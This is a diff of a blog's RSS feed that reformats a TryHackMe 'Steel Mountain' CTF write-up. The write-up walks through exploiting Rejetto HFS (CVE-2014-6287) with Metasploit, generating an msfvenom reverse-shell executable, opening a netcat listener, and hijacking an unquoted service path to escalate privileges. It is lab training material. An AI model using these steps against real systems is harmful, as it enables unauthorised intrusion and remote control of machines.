@@ -5,8 +5,8 @@
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 28 Dec 2021 18:15:22 +0000</pubDate>
-    <lastBuildDate>Tue, 28 Dec 2021 18:15:22 +0000</lastBuildDate>
+    <pubDate>Tue, 28 Dec 2021 18:18:52 +0000</pubDate>
+    <lastBuildDate>Tue, 28 Dec 2021 18:18:52 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
     
       <item>
@@ -595,9 +595,12 @@ There is a vulnerablity on the &lt;strong&gt;Rejetto HFS versions 2.3, 2.3a, and
 &lt;p&gt;Launch up your &lt;strong&gt;msfconsole&lt;/strong&gt; and do a search for &lt;strong&gt;CVE-2014-6287&lt;/strong&gt; to see if there is any exploit that we can use.
 There is one with an excellent rank, awesome! Let us use it.
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-Copy the THM IP with that command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ifconfig | grep -C 1 tun0 | tail -n 1 | awk &apos;{print $2}&apos;&lt;/code&gt;
-&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
--&amp;gt; set RPORT &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt;&lt;br /&gt;-&amp;gt; set RHOST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;machine IP&lt;/code&gt;&lt;br /&gt;-&amp;gt; set LHOST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;your THM IP&lt;/code&gt;&lt;br /&gt;-&amp;gt; exploit&lt;/p&gt;
+Copy the THM IP with that command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ifconfig | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; 1 tun0 | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print $2}&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+-&amp;gt; set RPORT &lt;strong&gt;8080&lt;/strong&gt;&lt;br /&gt;-&amp;gt; set RHOST &lt;strong&gt;machine IP&lt;/strong&gt;&lt;br /&gt;-&amp;gt; set LHOST &lt;strong&gt;your THM IP&lt;/strong&gt;&lt;br /&gt;-&amp;gt; exploit&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
@@ -623,7 +626,7 @@ Copy the THM IP with that command: &lt;code class=&quot;language-plaintext highl
 &lt;/table&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-After receiving meterpreter session, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; to get an interactive shell.
+After receiving meterpreter session, run &lt;strong&gt;shell&lt;/strong&gt; to get an interactive shell.
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
 Find the flag under &lt;strong&gt;C:\users\bill\Desktop&lt;/strong&gt; directory.
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
@@ -635,14 +638,14 @@ permissions against the system. &lt;strong&gt;PowerUp.ps1&lt;/strong&gt; is a pr
 any misconfigurations and privilege escalation possibilities.
 &lt;br /&gt;-&amp;gt; &lt;a href=&quot;../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;Download PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;
 &lt;br /&gt;-&amp;gt; &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;&lt;strong&gt;PowerSploit GitHub Repo&lt;/strong&gt;&lt;/a&gt;
-&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit&lt;/code&gt; and get back to the &lt;strong&gt;meterpreter&lt;/strong&gt; session.
+&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;exit&lt;/strong&gt; and get back to the &lt;strong&gt;meterpreter&lt;/strong&gt; session.
 &lt;br /&gt;-&amp;gt; Upload the script just as we did before to the machine.
-&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;load powershell&lt;/code&gt;
-&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell_shell&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;load powershell&lt;/strong&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;powershell_shell&lt;/strong&gt;
 &lt;br /&gt;You will get &lt;strong&gt;PowerShell&lt;/strong&gt; this time instead of a regular &lt;strong&gt;cmd prompt&lt;/strong&gt;.
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\PowerUp.ps1&lt;/code&gt;
-&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-AllChecks&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;. .\PowerUp.ps1&lt;/strong&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;strong&gt;Invoke-AllChecks&lt;/strong&gt;
 &lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
 &lt;br /&gt;&lt;br /&gt;The first result we got is a service called &lt;strong&gt;AdvancedSystemCare9&lt;/strong&gt;, and it has a vulnerability called 
 &lt;strong&gt;Unquoted Service Path&lt;/strong&gt; &lt;a href=&quot;https://krygennn.github.io/posts/unquoted-service-path-vulnerability/&quot;&gt;&lt;strong&gt;-&amp;gt; Read more about it&lt;/strong&gt;&lt;/a&gt;. We will abuse this vulnerability. 
@@ -684,11 +687,14 @@ the service itself is being run with &lt;strong&gt;LocalSystem&lt;/strong&gt; se
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;Full command -&amp;gt; &lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe&lt;/code&gt;
-&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;RANDOM FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;somename&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;-&amp;gt; Upload the binary to the target machine.
-&lt;br /&gt;-&amp;gt; Get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; again.
+&lt;br /&gt;-&amp;gt; Get the &lt;strong&gt;shell&lt;/strong&gt; again.
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;-&amp;gt; Relocate the binary into &lt;strong&gt;C:\Program Files (x86)\IObit&lt;/strong&gt; directory.
@@ -698,14 +704,19 @@ the service itself is being run with &lt;strong&gt;LocalSystem&lt;/strong&gt; se
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on your machine with the port that is defined when creating
-the backdoor.
-&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nvlp {SPECIFIED PORT}&lt;/code&gt;
-&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+the backdoor.&lt;/p&gt;
 
-&lt;p&gt;After starting a netcat session, restart the service
-&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc stop AdvancedSystemCareService9&lt;/code&gt;
-&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc start AdvancedSystemCareService9&lt;/code&gt;
-&lt;br /&gt;When the service boots, &lt;strong&gt;Advanced.exe&lt;/strong&gt; backdoor binary will be executed instead of the &lt;strong&gt;ASCService.exe&lt;/strong&gt;. 
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPECIFIED&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;After starting a netcat session, restart the service&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AdvancedSystemCareService9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;sc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AdvancedSystemCareService9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;When the service boots, &lt;strong&gt;Advanced.exe&lt;/strong&gt; backdoor binary will be executed instead of the &lt;strong&gt;ASCService.exe&lt;/strong&gt;. 
 &lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
 You can find the root flag &lt;strong&gt;root.txt&lt;/strong&gt; under &lt;strong&gt;C:\Users\Administrator\Desktop&lt;/strong&gt; directory.&lt;/p&gt;
 
